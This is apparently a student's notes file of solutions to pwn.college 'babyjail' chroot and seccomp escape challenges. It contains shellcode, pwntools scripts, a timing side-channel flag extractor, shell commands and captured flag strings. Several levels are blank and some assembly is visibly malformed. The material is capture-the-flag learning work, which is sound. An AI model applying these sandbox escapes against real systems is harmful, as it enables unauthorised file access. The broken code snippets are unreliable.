/* # ssh -i key hacker@dojo.pwn.college

//# base c file?
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

int main()
{
        char buf[1024];
        int fd = open("/etc/passwd", 0);
        printf("CWD before chroot: %s\n", getcwd(buf, 128));
        chroot("/tmp");
        printf("CWD after chroot: %s\n", getcwd(buf, 128));
        write(1, buf, read(fd, buf, 1024));
        puts("Goodbye");


}

gcc -o jail jail1.c

# base open s file
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "../../flag\0"

gcc -nostdlib -o solve.elf open.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf

==========================================================================================
==========================================================================================
==========================================================================================

# 1

int main()
{
        char buf[1024];
        int fd = open("/etc/passwd", 0);
        printf("CWD before chroot: %s\n", getcwd(buf, 128));
        chroot("/tmp");
        printf("CWD after chroot: %s\n", getcwd(buf, 128));
        write(1, buf, read(fd, buf, 1024));
        puts("Goodbye");


}

gcc -o jail jail2.c
./jail

cd /
run /challenge/babyjail1 ./flag
pwn.college{c5Ky7b88agQecU5IesTZZp5Eeas.QXxMjMscTOxUzW}

==========================================================================================

# 2
# s file
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "../../flag\0"

gcc -nostdlib -o solve.elf open.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf

/challenge/babyjail2 ../../etc/passwd < ~/solve.bin

pwn.college{sogg6R3HB6XibHocY0FRCQOPDYJ.QXyMjMscTOxUzW}

==========================================================================================

# 3
# s file
.global _start
.intel_syntax noprefix
_start:
    # alternate openat function
	mov rdx
	lea rsi[rip+openat_flag]
	# need parent process to open fd 3 -> embryoio stuff
	mov rdi, 3
	mov rax, 257
	syscall

    # open files
#	mov rsi, 0
#	lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
#	mov rax, 2              #syscall 2 opens file
#	syscall

    #read files
	mov rdi, rax    #file saved in rax from above syscall
	mov rsi, rsp    #move file to readable register
	mov rdx, 100    # reads 100 bytes
	mov rax, 0
	syscall

    #write files
	mov rdi, 1      #write to stdout
	mov rsi, rsp    #moves file to write 
	mov rdx, rax    #reads # of bytes to write
	mov rax, 1
	syscall

    #exit
	mov rax, 60
	mov rax, 42
	syscall

# \0 is null terminating for strings
flag:
    .ascii "../../flag\0"

openat_flag:
	.ascii "flag\0"

gcc -nostdlib -o solve.elf open.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf

/challenge/babyjail_level3 / < solve.bin

pwn.college{Y-yxjDS0DXePwoU1NzAmJeh3daB.QXzMjMscTOxUzW}

==========================================================================================

# 4
.global _start
.intel_syntax noprefix
_start:
    # alternate openat function
	mov rdx, 0
	lea rsi, [rip+openat_flag]
	# need parent process to open fd 3 -> embryoio stuff
	mov rdi, 3
	mov rax, 257
	syscall

    # open files
#	mov rsi, 0
#	lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
#	mov rax, 2              #syscall 2 opens file
#	syscall

    #read files
	mov rdi, rax    #file saved in rax from above syscall
	mov rsi, rsp    #move file to readable register
	mov rdx, 100    # reads 100 bytes
	mov rax, 0
	syscall

    #write files
	mov rdi, 1      #write to stdout
	mov rsi, rsp    #moves file to write 
	mov rdx, rax    #reads # of bytes to write
	mov rax, 1
	syscall

    #exit
	mov rax, 60
	mov rax, 42
	syscall

# \0 is null terminating for strings
flag:
    .ascii "../../flag\0"

openat_flag:
	.ascii "flag\0"

gcc -nostdlib -o solve.elf open9.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf

/challenge/babyjail_level3 / < solve.bin

pwn.college{g08SuMeqWCl0VRIQzrEEVf8yssF.QX0MjMscTOxUzW}

==========================================================================================

# 5 -> using linkat (265)
# using python pwn
import pwn

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

with pwn.process(["/challenge/babyjail_level5", "/"]) as target:
    pwn.info(target.readrepeat(1))


    target.send(pwn.asm(f"""
    {pwn.shellcraft.pushstr("flag")}
    mov rsi, rsp
    {pwn.shellcraft.linkat(3, "rsi", -100, "abc", 0)}

    {pwn.shellcraft.open("/abc", 0)}

    {pwn.shellcraft.sendfile(1, 4, 0, 1024)}
    """))

    pwn.info(target.readrepeat(1))

python3 jail5.py
pwn.college{Mg_bgz4gSfzRuIhY2R0liVUNjEX.QX1MjMscTOxUzW}
==========================================================================================

# 6


==========================================================================================

# 7 -> kernal has no memory of chroot
# check where chroot is at 
# chroot again and move "wall"
# move wall to where you are
# s file







==========================================================================================

# 8


==========================================================================================

# 9 -> seccomp
# int 0x80 -> use syscalls for 32 bit mode

 #open
    xor ecx, ecx
    lea ebx, [eip+flag]
    mov eax, 5
    int 0x80

    #read
    mov ebx, eax
    mov ecx, esp
    mov edx, 28
    mov eax, 3
    int 0x80

    #write files
	mov edi, 1      #write to stdout
	mov esi, esp    #moves file to write 
	mov edx, eax    #reads # of bytes to write
	mov eax, 1
	int 0x80

    #exit
	mov eax, 60
	mov eax, 42
	syscall

==========================================================================================

# 10 only read and exit
# exit s file
.global _start
.intel_syntax noprefix
start:
        mov rax, 60
        mov rdi, 42
        syscall
# parent can see what exit code the child exited with
# exit is a side channel

==========================================================================================

# 11
# python file
import pwn
import time
import signal


pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

iteration_progress = pwn.log.progress("PROGRESS")
flag_progress = pwn.log.progress("FLAG")

flag = b""

for i in range(0,100):
    for b in range(256):

        iteration_progress.status(f"Iteration {i}, Byte {b}")

        start = time.time()

        #alarm = process dies after set time
        with pwn.process(["/challenge/babyjail_level10", "/flag"], level="CRITICAL") as target:
            #pwn.info(target.readrepeat(1))

            target.send(pwn.asm(f"""
            //allocate room to stack
            sub rsp, 0x1000

            //reading single byte from flag
            {pwn.shellcraft.read(3, "rsp", i)}
            {pwn.shellcraft.read(3, "rsp", 1)}
            xor rax, rax
            mov al, [rsp]

            //compare single byte to hex 80
            cmp rax, {b}
            jne crash

            sleep:
            lea rdi, [rip+time]
            mov rax, SYS_nanosleep
            syscall
            
            crash:
            

            time:
            .8byte 2
            .8byte 0
            
            """))

            target.poll(True)

        end = time.time()
            #pwn.info(target.readrepeat(1))
        if end - start > 2:
            flag+= bytes([b])
            flag_progress.status(repr(flag))
            break

        #print(b, end - start)


#byte iteration 12 -> {}
# 15 -> 7
# 26 -> Y
# 32 -> 4
# 36 -> D
# 37,38 -> WW
# 42 -> x
# 48 -> c
pwn.college{ElO79ajCCiIYseYe-1YC4AaRDWW.QXxQjMscTOxUzW}
==========================================================================================

# 12 can only read -> side channel of communication
# try using time /challenge/babyjail_level12 /flag < solve.bin
# check if bit is a 1 or 0 and do it again and again ... 
# 11 uses nanosleep look at IPC -> time based attack


==========================================================================================

# 13



==========================================================================================

# 14

vm connect

cd old
cat flag
pwn.college{wVPM0J0hUNYtZXVYwh0BrWaHzai.01NwMzMscTOxUzW}

==========================================================================================

# 15

vm connect

/challenge/babyjail15
chmod 7777 /bin/cat

in vm
/usr/bin /flag
pwn.college{MDyv3xGbhnW9WV3JoQC6hjMbtrx.0FOwMzMscTOxUzW}

==========================================================================================

# 16

cat /proc/*/*/*/* > catProc
pwn.college{geCajJA4YcEYCAe2LAD7R1VfKQG.0VOwMzMscTOxUzW}










*/

